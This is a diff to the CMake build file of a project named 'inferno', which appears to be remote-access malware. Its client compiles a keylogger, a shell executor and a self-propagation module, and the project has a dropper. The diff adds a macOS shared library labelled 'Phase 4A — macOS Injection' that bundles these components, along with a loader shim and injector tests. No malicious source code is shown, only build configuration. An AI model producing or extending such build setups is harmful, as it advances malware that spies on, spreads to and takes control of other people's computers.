@@ -86,6 +86,7 @@ add_executable(inferno_client
     client/src/ShellExecutor.cpp
     client/src/KeyLogger.cpp
     client/src/Propagator.cpp
+    client/src/entry_dylib.cpp
 )
 target_link_libraries(inferno_client PRIVATE inferno_common)
 
@@ -105,7 +106,33 @@ if(WIN32)
 endif()
 
 # ==========================================
-# 5. TDD Infrastructure
+# 5. Agent Dylib (Phase 4A — macOS Injection)
+# ==========================================
+if(APPLE)
+    add_library(inferno_agent_dylib SHARED
+        client/src/entry_dylib.cpp
+        client/src/Agent.cpp
+        client/src/ProcessProfiler.cpp
+        client/src/ShellExecutor.cpp
+        client/src/KeyLogger.cpp
+        client/src/Propagator.cpp
+    )
+    target_include_directories(inferno_agent_dylib PRIVATE client/include)
+    target_compile_definitions(inferno_agent_dylib PRIVATE INFERNO_DYLIB)
+    target_link_libraries(inferno_agent_dylib PRIVATE inferno_common)
+    target_link_libraries(inferno_agent_dylib PRIVATE
+        ${CORE_GRAPHICS} ${CARBON} ${IO_KIT} ${CORE_FOUNDATION}
+    )
+    set_target_properties(inferno_agent_dylib PROPERTIES
+        OUTPUT_NAME "inferno_agent"
+    )
+
+    add_executable(inferno_shim client/src/shim.cpp)
+    target_link_libraries(inferno_shim PRIVATE ${CMAKE_DL_LIBS})
+endif()
+
+# ==========================================
+# 6. TDD Infrastructure
 # ==========================================
 enable_testing()
 add_executable(inferno_tests
@@ -129,11 +156,19 @@ add_executable(inferno_tests
     client/src/KeyLogger.cpp
     client/src/Propagator.cpp
 )
+target_include_directories(inferno_tests PRIVATE client/include)
 target_link_libraries(inferno_tests PRIVATE inferno_common Qt6::Widgets Qt6::Gui Qt6::Core Qt6::Sql)
 target_compile_definitions(inferno_tests PRIVATE INFERNO_TESTING)
 
 if(APPLE)
     target_link_libraries(inferno_tests PRIVATE ${CORE_GRAPHICS} ${CARBON} ${IO_KIT} ${CORE_FOUNDATION})
+    target_sources(inferno_tests PRIVATE
+        tests/injector_test.cpp
+        client/src/entry_dylib.cpp
+    )
+    target_compile_definitions(inferno_tests PRIVATE
+        TEST_BINARY_DIR="${CMAKE_CURRENT_BINARY_DIR}"
+    )
 endif()
 
 if(WIN32)
@@ -143,6 +178,6 @@ endif()
 add_test(NAME CoreNetworkingTests COMMAND inferno_tests)
 
 # ==========================================
-# 6. Agent Wrapper / Dropper (Phase 2.3)
+# 7. Agent Wrapper / Dropper (Phase 2.3)
 # ==========================================
 add_subdirectory(wrapper)
